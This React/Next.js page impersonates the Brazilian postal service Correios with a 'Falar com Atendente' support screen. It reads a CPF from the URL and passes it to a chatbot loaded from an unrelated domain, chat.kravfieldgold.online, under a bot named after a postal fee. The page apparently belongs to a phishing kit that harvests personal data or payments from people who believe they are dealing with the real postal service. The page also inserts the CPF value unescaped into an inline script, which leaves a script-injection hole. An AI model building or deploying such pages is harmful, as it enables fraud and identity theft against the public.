"use client"

import {
  Menu,
  ExternalLink,
  FileText,
  Phone,
  ShoppingCart,
  HelpCircle,
  Users,
  Building,
  GraduationCap,
  Search,
  Lock,
  Shield,
} from "lucide-react"
import { useEffect, useState } from "react"
import { useSearchParams } from "next/navigation"

export default function AtendimentoPage() {
  const [isMounted, setIsMounted] = useState(false)
  const searchParams = useSearchParams()
  const cpfParam = searchParams.get("cpf")

  useEffect(() => {
    setIsMounted(true)
  }, [])

  useEffect(() => {
    if (isMounted) {
      // Load Typebot script
      const script = document.createElement("script")
      script.type = "module"
      script.innerHTML = `
        import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js';
        Typebot.initStandard({
          typebot: "tarifa-correios-rh02265",
          apiHost: "https://chat.kravfieldgold.online",
          ${cpfParam ? `prefilledVariables: { cpf: "${cpfParam}" },` : ""}
        });
      `
      document.head.appendChild(script)

      return () => {
        document.head.removeChild(script)
      }
    }
  }, [isMounted, cpfParam])

  if (!isMounted) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">Carregando...</div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header style={{ backgroundColor: "#f5f3f0" }}>
        {/* Top section with accessibility and login */}
        <div className="flex items-center justify-between px-4 py-2">
          <div className="flex items-center gap-4">
            <button className="text-blue-600 text-sm">Acessibilidade ▼</button>
          </div>
        </div>

        <div className="h-px bg-white w-full"></div>

        {/* Main header section with logo and login button */}
        <div className="flex items-center justify-between px-4 py-3">
          {/* Mobile layout: hamburger left, logo center */}
          <div className="md:hidden flex items-center justify-between w-full">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
            <div className="w-6"></div> {/* Spacer for centering */}
          </div>

          {/* Desktop layout: hamburger and logo left, login right */}
          <div className="hidden md:flex items-center gap-4 flex-1">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
          </div>

          <div className="hidden md:flex items-center gap-2">
            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
          </div>
        </div>

        <div className="bg-yellow-400 w-full h-px"></div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Breadcrumb */}
        <nav className="flex items-center gap-2 mb-4 tracking-normal text-base">
          <span className="md:hidden">
            <span className="text-blue-600">{"<"}</span>
            <span className="text-black ml-1">Atendimento</span>
          </span>
          <div className="hidden md:flex items-center gap-2 text-blue-600">
            <span>Portal Correios</span>
            <span className="text-foreground">›</span>
            <span>Rastreamento</span>
            <span className="text-foreground">›</span>
            <span>Atendimento</span>
          </div>
        </nav>

        {/* Page Title */}
        <h1 className="text-2xl font-bold mb-6 text-[rgba(0,64,105,1)]">
          Falar com Atendente
          {cpfParam && (
            <span className="text-sm font-normal text-gray-600 ml-2">
              (CPF: {cpfParam.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")})
            </span>
          )}
        </h1>

        {/* Typebot Container */}
        <div className="bg-white p-6 rounded-sm border">
          <typebot-standard style={{ width: "100%", height: "600px" }}></typebot-standard>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 text-black py-8 mt-12">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {/* Fale Conosco */}
            <div>
              <h3 className="font-bold mb-4 text-[rgba(0,64,105,1)] text-lg md:text-2xl">Fale Conosco</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm md:text-base">
                    Registro de Manifestações
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Central de Atendimento
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Soluções para o seu negócio
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Suporte ao cliente com contrato
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Ouvidoria</span>
                </li>
                <li className="flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Denúncia</span>
                </li>
              </ul>
            </div>

            {/* Sobre os Correios */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Sobre os Correios</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Identidade corporativa
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Educação e cultura</span>
                </li>
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Código de ética</span>
                </li>
                <li className="flex items-center gap-2">
                  <Search className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Transparência e prestação de contas
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Política de Privacidade e Notas Legais
                  </span>
                </li>
              </ul>
            </div>

            {/* Outros Sites */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Outros Sites</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2 text-[rgba(0,64,105,1)]">
                  <ExternalLink className="w-4 h-4" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Loja online dos Correios
                  </span>
                </li>
              </ul>
            </div>
          </div>

          <div className="text-center mt-8 pt-4 border-t border-yellow-500">
            <p className="text-sm">© Copyright 2025 Correios</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
